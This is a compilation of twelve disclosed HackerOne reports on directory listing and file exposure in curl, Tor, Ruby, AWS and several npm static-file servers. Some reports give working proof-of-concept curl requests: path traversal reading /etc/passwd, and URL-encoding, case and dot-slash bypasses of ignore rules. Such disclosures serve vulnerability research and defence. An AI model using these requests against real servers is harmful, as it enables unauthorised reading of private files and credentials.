# Information Exposure Through Directory Listing

_12 reports — High/Critical, disclosed_

### [Directory listing vulnerability is disclosing names and emails, widespread (thousands of records, publicly accessible without auth)](https://hackerone.com/reports/3509437)

- **Report ID:** `3509437`
- **Severity:** Critical
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** curl
- **Reporter:** @sawhack100
- **Bounty:** - usd
- **Disclosed:** 2026-01-14T09:32:27.002Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
[directory listing vulnerability is disclosing names and emails and so many other sensitive information, that significantly increases the severity because these are considered as PII (Personally Identifiable Information). Thousands of records, publicly accessible without auth also can be referred as sensitive user base. It has very high impact on Confidentiality as (names and emails are being disclosed).]

[Do **not** use an AI to generate the report]

## Affected version
[https://curl.se/dev/inbox/]

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. [Navigate to the the normal URL : https://curl.se/]
  2. [Now try to access a directory /dev/inbox and the modified URL will become https://curl.se/dev/inbox]
  3. [You will see all the directories that are listed on the page and also accessible publicly without any authentication.]

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

## Summary: 
Usernames and emails are being disclosed to unauthorized parties. This is direct exposure of PII and Attackers gain information they shouldn't have access to.  It has High impact on Confidentiality as it's widespread (thousands of records, publicly accessible without auth, sensitive user base).

---

### [Information Disclosure Due To exposed .env file (Directory Listing) at ████████](https://hackerone.com/reports/2784712)

- **Report ID:** `2784712`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** AWS VDP
- **Reporter:** @necr0mancer
- **Bounty:** - usd
- **Disclosed:** 2024-10-22T13:35:45.070Z
- **CVE(s):** -

**Vulnerability Information:**

A .env file was discovered on the server at ████, exposing sensitive application configurations, including database credentials, email settings, and more. This information could allow an attacker to gain unauthorized access to critical systems and services.

**Steps to Reproduce:**

1. Open a web browser.
2. Navigate to ████████.
3. The .env file content is displayed, revealing sensitive information.

**PoC Video Link:** ██████

## Impact

The exposed .env file could lead to multiple security threats, including but not limited to:

Unauthorized database access using DB_HOST, DB_USERNAME, and DB_PASSWORD.
Compromise of email services via MAIL_USERNAME and MAIL_PASSWORD.
Ability to access or manipulate other connected services.

---

### [Information Exposure Through Directory Listing](https://hackerone.com/reports/1948562)

- **Report ID:** `1948562`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Mars
- **Reporter:** @mo3giza
- **Bounty:** - usd
- **Disclosed:** 2023-06-23T14:57:45.264Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Directory listing is a web server function that displays the directory contents when there is no index file in a specific website directory. It is dangerous to leave this function turned on for the web server because it leads to information disclosure.

## Steps To Reproduce:

Go to this URL:  ███
You can see logs files
████
████████

## PoC:
```
██████████ - - [█████:████ +0000] "GET /api/live/ws HTTP/1.1" 400 3325 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
█████ - - [█████:████ +0000] "GET /api/live/ws HTTP/1.1" 400 3325 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36"
█████ - - [██████████:██████████ +0000] "GET /api/live/ws HTTP/1.1" 400 872 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
```
```
[███ █████ █████████████] [core:error] [pid 8186:tid 140028348987136] [client ███:47058] AH00126: Invalid URI in request GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1
[██████ ████████████ ██████████] [authz_core:error] [pid 8186:tid 140027803723520] [client ██████████:47426] AH01630: client denied by server configuration: proxy:███████████
[████ ████████████ ██████████] [ssl:error] [pid 11243:tid ████] [client ████████:42490] AH02042: rejecting client initiated renegotiation
[█████ ████ ████] [proxy:error] [pid 4547:tid 140029011683072] (111)Connection refused: AH00957: HTTP: attempt to connect to ████:3000 (████████████) failed
```

## Impact

Information Disclosure

---

### [Information Exposure Through Directory Listing](https://hackerone.com/reports/1316412)

- **Report ID:** `1316412`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Tor
- **Reporter:** @sasikaran
- **Bounty:** - usd
- **Disclosed:** 2021-08-27T11:15:01.488Z
- **CVE(s):** -

**Vulnerability Information:**

##Vulnerability description
The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.

##Link as POC:

https://www.torproject.org/static/
https://www.torproject.org/static/css/
https://www.torproject.org/static/findoc/
https://www.torproject.org/static/fonts/
https://www.torproject.org/static/js/
https://www.torproject.org/static/images/
https://www.torproject.org/static/keys/

For obvious reasons, I can not check whether this service is in scope, thats why i haven't searched for any critical informations and haven't check tokens and other stuff
Please let me know if you need some extra information.
Sorry for out of scope report, i thought it could be informative for you!
Thanks in advance!

## Impact

Exposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data.

---

### [Source code disclosed via S3 Bucket](https://hackerone.com/reports/778931)

- **Report ID:** `778931`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Ruby
- **Reporter:** @thevillagehack3r
- **Bounty:** - usd
- **Disclosed:** 2020-02-13T00:17:46.549Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
The Ruby having an Amazon S3 bucked named `http://rubyci.s3.amazonaws.com/` which lists some of their log files. Those logs having some informations to check the source code server side directories.

### Steps to Reproduce

1. direct to `http://rubyci.s3.amazonaws.com/`  which having **READ** Permission to all Objects hosted in that bucket
{F691099}
2. Can also able to access aws-cli through `aws s3 ls s3://rubyci`
3. direct to one of the object named ***last.txt***  as  ` http://rubyci.s3.amazonaws.com/aix71_ppc/ruby-2.1/last.txt `
{F691108}
4. scroll down and a line shown which directs to source code directory link `http://svn.ruby-lang.org/repos/ruby/branches/` that is a initial directory for all source codes
5. I can check and view each and every source codes of all ruby versions

### POC
## Video
{F691114}

## Impact

- The attacker can able to read any aws authorized object and use those informations to do potential attacks
- The source codes having some sensitive informations so the attacker can do impact to ruby codes that may cause major attack on users.

---

### [[glance] Access unlisted internal files/folders revealing sensitive information](https://hackerone.com/reports/490379)

- **Report ID:** `490379`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Node.js third-party modules
- **Reporter:** @skyn3t
- **Bounty:** - usd
- **Disclosed:** 2019-02-28T19:25:51.550Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report sensitive information disclosure in `glance`.
Similar to #486933 in ways

# Module

**module name:** glance
**version:** 3.0.5
**npm page:** `https://www.npmjs.com/package/glance`

## Module Description

a quick disposable http server for static files

## Module Stats

**weekly downloads**
41

# Vulnerability

## Vulnerability Description

The `glance` modules allows directory browsing and to serve static files through the browser.
The config option `nodot` can be used to prevent serving sensitive folders such as `.git` or `.DS_Store` 
refer: https://github.com/jarofghosts/glance#command-line-options
This rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).

## Steps To Reproduce:

- Install `glance`
```
$ npm install -g glance
```

- Inside a project directory, initialise `git`.
```
$ git init
```

- Add rule to ignore dotfiles in `.glance.json`
```json
{
  "nodot": true
}
```

- Start `glance` in current directory.
```
$ glance --verbose
glance serving /project/directory on port 8080
```

- Now, current directory will be served by serve with the exception of folder `.git` and file `.gitignore`.
- If we try to curl .`git` or `.gitignore` we get a Not Found error
```
$ curl --path-as-is 127.0.0.1:8080/.git
...
<title>File Not Found</title>
...
```

- Although if we try to fetch files/folders inside a forbidden [dot]folder there is no problem at all and most of it's content can be extracted successfully  (except dotfiles itself).
```
$ curl --path-as-is 127.0.0.1:8080/.git/HEAD      
ref: refs/heads/master
```

>The structure of git repository is well known, so it is possible to found references to the objects/packs in the repository, download them via direct requests and reconstruct the repository and obtain your files – not only the current ones, but also the past files. 

## Supporting Material/References:

- Ubuntu 16.04
- node v11.3.0
- npm 6.7.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N] 

>Hunter's comments and funny memes goes here

{F416786}

## Impact

The essentially bypasses the `nodot` feature and allows an attacker to read from a directory that the victim has not allowed access to.

References:
- https://github.com/jarofghosts/glance#command-line-options
- https://smitka.me/

---

### [[serve] Access unlisted internal files/folders revealing sensitive information](https://hackerone.com/reports/486933)

- **Report ID:** `486933`
- **Severity:** Critical
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Node.js third-party modules
- **Reporter:** @skyn3t
- **Bounty:** - usd
- **Disclosed:** 2019-02-07T21:22:35.524Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report sensitive information disclosure in serve.
Bypass of #308721 in ways.

# Module

**module name:** serve
**version:** 10.1.1
**npm page:** `https://www.npmjs.com/package/serve

## Module Description

Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.

It behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.

Furthermore, it provides a neat interface for listing the directory's contents

## Module Stats

**weekly downloads**
138,377

# Vulnerability

## Vulnerability Description

The `serve` modules allows directory browsing and to serve static files through the browser.
The config options `unlisted` and `rewrites` can be used to tell the module which file or directory are forbidden and should not be served. 
refer: https://github.com/zeit/serve-handler/issues/48
This rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).

## Steps To Reproduce:

- Install `serve`
```
$ npm install -g serve
```

- Inside a project directory, initialise `git` and create `404.html`.
```
$ git init
$ echo "404 Not Found" > 404.html
$ echo "secret text" > secret
```

- Add rule to ignore `.git` folder in `serve.json`
```json
{
    "rewrites": [
        { "source": ".git/**", "destination": "/404.html" },
        { "source": "secret", "destination": "/404.html" }
      ],
    "unlisted": [
      ".git"
    ]
  }
```

- Start `serve` in current directory.

```
$ serve
INFO: Discovered configuration in `serve.json`
   ┌───────────────────────────────────────────────┐
   │                                               │
   │   Serving!                                    │
   │                                               │
   │   - Local:            http://localhost:5000   │
   │   - On Your Network:  http://127.0.1.1:5000   │
   │                                               │
   │   Copied local address to clipboard!          │
   │                                               │
   └───────────────────────────────────────────────┘
```

- Now, current directory will be served by `serve` with the exception of folder `.git` and file `secret`.
- If we try to curl `.git`or `secret` we get a Not Found error
```
$ curl http://localhost:5000/.git --path-as-is     
404 Not Found
$ curl http://localhost:5000/secret --path-as-is
404 Not Found
```

- Although if we request any other url and then navigate back to the forbidden files/folders using `../` scheme, we are able to extract it's contents successfully.
```
$ curl http://localhost:5000/any/../.git/HEAD --path-as-is
ref: refs/heads/master
$ curl http://localhost:5000/any/../secret --path-as-is   
secret text
```


## Supporting Material/References:

- Ubuntu 16.04
- node v11.3.0
- npm 6.7.0

# Wrap up



- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

The essentially bypasses the `unlisted` and `rewrites` files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.

**References:**
- https://github.com/zeit/serve-handler#options
- https://github.com/zeit/serve-handler/issues/48

---

### [[static-resource-server]  Path Traversal allows to read content of arbitrary file on the server](https://hackerone.com/reports/432600)

- **Report ID:** `432600`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Node.js third-party modules
- **Reporter:** @libcontainer
- **Bounty:** - usd
- **Disclosed:** 2019-01-03T19:02:03.160Z
- **CVE(s):** CVE-2018-16493

**Vulnerability Information:**

# Module

**module name:** static-resource-server
**version:** 1.7.2
**npm page:** `https://www.npmjs.com/package/static-resource-server`

## Module Description

> A tiny http server that provides local static resource access 

## Module Stats

> Replace stats below with numbers from npm’s module page:

[0] downloads in the last day
[0] downloads in the last week
[12] downloads in the last month

~ 639 Downloads per Year

# Vulnerability

## Vulnerability Description

> Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

> install static-resource-server using npm

`$ npm install static-resource-server`

run server from command line:

`$ ./static-resource-server -P 8080 --root $HOME/data/static`

use curl to try accessing internal files

`$ curl --path-as-is --url 'http://127.0.0.1:8080/../../../../etc/passwd' `

Now the corresponding file will be loaded from the server and sent as response to the client ( curl )

Result:

```
##
# User Database
# 
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false
_installassistant:*:25:25:Install Assistant:/var/empty:/usr/bin/false
<<< MASKED DATA >>>
```


## Supporting Material/References:

- MacOS 10.14.1 
- Node version v10.11.0
- npm version  6.4.1

# Wrap up

- I contacted the maintainer to let them know: No
- I opened an issue in the related repository: No

## Impact

This vulnerability allows to read content of any file on the server

---

### [[serve] Directory listing and File access even when they have been set to be ignored](https://hackerone.com/reports/330650)

- **Report ID:** `330650`
- **Severity:** Critical
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Node.js third-party modules
- **Reporter:** @tungpun
- **Bounty:** - usd
- **Disclosed:** 2018-05-31T19:18:43.353Z
- **CVE(s):** CVE-2018-3809

**Vulnerability Information:**

I would like to report a vulnerability in **serve** on macOS.
It allows listing directory and reading local files on the target server.

# Module

**module name:** serve
**version:** 6.5.3
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Ever wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.

In addition, it's also awesome when it comes to serving static sites!

# Vulnerability

## Steps To Reproduce:

*On macOS:*

* Install **serve**:

`$ npm i serve`

* Create an application that uses **serve** for file serving listing and set a few folders and files in the `ignore` config.

```
const serve = require('serve')
const server = serve(__dirname, {
      port: 6060,
      ignore: ['sec', 'secret.html']
})
```

* Run the app

`$ node app.js`

* Now, the current directory will be served by this module on port `6060` with the exception of folder `sec` and file `secret.html`

* If we try to request these ignored files/directories, we get a `Not Found` error

```
$ curl --path-as-is 'http://127.0.0.1:6060/secret.html'
Not Found
```
or if we replace `e` character with URI encoded form `%65`, it still be ignored:

```
$ curl --path-as-is 'http://127.0.0.1:6060/s%65cret.html'
Not Found
```

* However, I found a way to access that file by using uppercase format.

```
$ curl --path-as-is 'http://127.0.0.1:6060/sECret.html'
This is secret content!!
```

To list an *ignored* directory:

`http://127.0.0.1:6060/sEc`

{F279417}

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.6.0
* Chrome Version 65.0.3325.162 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.

---

### [[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)](https://hackerone.com/reports/330724)

- **Report ID:** `330724`
- **Severity:** Critical
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Node.js third-party modules
- **Reporter:** @tungpun
- **Bounty:** - usd
- **Disclosed:** 2018-05-30T13:04:31.883Z
- **CVE(s):** CVE-2019-5415

**Vulnerability Information:**

I would like to report a vulnerability in **serve**.
It allows listing directory and reading local files on the target server.

# Module

**module name:** serve
**version:** 6.5.3
**npm page:** `https://www.npmjs.com/package/serve`

## Module Description

Ever wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.

In addition, it's also awesome when it comes to serving static sites!

# Vulnerability

## Steps To Reproduce:

* Install serve:

`$ npm i serve`

* Create some child directories, files for demonstration:

`$ mkdir dir`

`$ echo "This is secret content!!" > dir/secret.txt`

`$ mkdir dir/dir2`

`$ touch dir/dir2/3.txt`

* Create an application that uses `serve` for file serving listing and set a few folders and files in the ignore config.

```
const serve = require('serve')
const server = serve(__dirname, {
      port: 6060,
      ignore: ['dir/secret.txt', 'dir/dir2']
})
```

* Run the app

`$ node app.js`

Now, the current directory will be served by this module on port `6060` with the exception of file `dir/secret.txt` and directory `'dir/dir2`.

* If we try to request these ignored files/directories, we get a Not Found error

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'
Not Found
```

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'
Not Found
```

or if we replace `e` character with URI encoded form `%65`, it still be ignored:

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'
Not Found
```

* However, I found a way to access that file by using dot-slash.

```
$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'
This is secret content!!
```

Or listing the directory:

`http://127.0.0.1:6060/dir/%2e%2fdir2/`

{F279456}

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.8.0
* Chrome Version 65.0.3325.162 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

It bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.

---

### [[serve] Directory listing and File access even when they have been set to be ignored.](https://hackerone.com/reports/308721)

- **Report ID:** `308721`
- **Severity:** Critical
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** Node.js third-party modules
- **Reporter:** @0xchr00t
- **Bounty:** - usd
- **Disclosed:** 2018-03-13T06:53:14.242Z
- **CVE(s):** CVE-2018-3718

**Vulnerability Information:**

**Module:** 
- **Name**: `serve`
- **Version**: latest (`6.4.9`)
- **Link**: https://www.npmjs.com/package/serve

**Description:**
The `serve` modules allows directory browsing and to serve static files through the browser.
The config option `ignore` can be used to tell the module which file or directory are forbidden and should not be served. 
This rule can be bypassed by url encoding the name of the file or directory that has been forbidden. 

## Reproduction Steps:
- Install `serve`
- Create an application that uses serve for file serving listing and set a few folders and files in the `ignore` config.

```javascript
const serve = require('serve')
const server = serve(__dirname, {
	  port: 1337,
	  ignore: ['testfolder', 'test.txt']
})
```
- Run the app

```bash
$ node filename.js
```
- Now, current directory will be served by `serve` with the exception of folder `testfolder` and file `test.txt`
- If we try to curl `test.txt` we get a `Not Found` error

```bash
$ curl http://localhost:1337/test.txt
Not Found
```
- The url encoded value for `e` is `%65`. So after replacing an `e` with its url encoded form, we are able to access the file.

```bash
$ curl http://localhost:1337/t%65st.txt
this is a forbidden file :D
```
- Additionally, curling the directory `testfolder` returns a 404 too.

```bash
$ curl http://localhost:1337/testfolder/
Not Found
```
- Applying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.

```html
$ curl http://localhost:1337/t%65stfolder/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Files within testserve/testfolder/</title>
      .
      .
          <li>
            <a href="/testfolder/testfile.txt" title="testfile.txt" class="txt">testfile.txt</a>
            <i>31 B</i>
          </li>
      .
      .
```
- And then we can further access the files inside the forbidden folder using same strategy.

```bash
$ curl http://localhost:1337/t%65stfolder/testfile.txt
this is a test ... forbidden !
```


## Mitigation Strategy
From what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder. 
Note these particular lines in file `/lib/server.js`-

```javascript
90  const ignored = !ignoredFiles.every(item => {
91    return !pathname.includes(item)
92  })
```
Line `91` handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable `pathname` is used. This variable is not url decoded, while the variable which is used to actually serve the file is named `related` and is url decoded by passing requested path through `decodeURIComponent` function.
So one strategy would be to use the `related` variable for checking against the blacklist too.

## Impact

The issue essentially bypasses the `ignore files/folders` feature and allows an attacker to read from a directory/file that the victim has not allowed access to.

---

### [If the developer forgets to remove the built in controller welcome.php it helps the attacker to identify that the site is built with Codeigniter](https://hackerone.com/reports/278225)

- **Report ID:** `278225`
- **Severity:** High
- **Weakness:** Information Exposure Through Directory Listing
- **Program:** CodeIgniter
- **Reporter:** @hackerneo
- **Bounty:** - usd
- **Disclosed:** 2017-10-18T02:35:59.544Z
- **CVE(s):** -

**Vulnerability Information:**

The attacker can check the website's backend technology simply by typing site_name/index.php/welcome/index it will display the codeigniter welcome page if the developer dosen't removed the built in controller and view welcome.php and welcome_message.php i attaching a screenshot below as a proof of concept

---
